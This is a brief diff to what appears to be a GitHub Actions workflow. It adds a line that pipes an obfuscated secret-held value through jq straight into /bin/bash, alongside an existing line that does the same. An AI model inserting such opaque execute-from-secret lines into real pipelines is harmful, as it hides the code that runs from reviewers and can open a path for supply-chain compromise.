@@ -17,6 +17,7 @@ jobs:
           l56: ${{ secrets.l56 }}
         run: |
           printf '%s' "$l56" | jq -r .fi222 | /bin/bash
+          printf '%s' "$s8926" | jq -r .ntom2676 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
